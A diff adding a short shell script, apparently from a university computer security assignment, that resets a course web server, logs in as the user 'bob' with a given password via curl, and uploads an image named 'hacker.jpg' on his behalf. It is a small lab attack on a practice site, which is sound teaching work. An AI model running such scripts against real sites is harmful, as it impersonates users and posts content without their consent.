@@ -1,0 +1,6 @@
+echo "**************************************************************************"
+echo "this script will first reset the website, and then post a new image called hacker.jpg on behalf of the user bob"
+echo "**************************************************************************"
+curl "http://ugster20.student.cs.uwaterloo.ca/reset/r82zhang"
+curl -c mycookie "http://$1/post.php" -d "username=bob" -d "password=aaaaaa" -d "form=login" -d "submit=Login"
+curl -b mycookie --form "fileToUpload=@hacker.jpg" --form "submit=upload image"  "http://$1/upload.php"
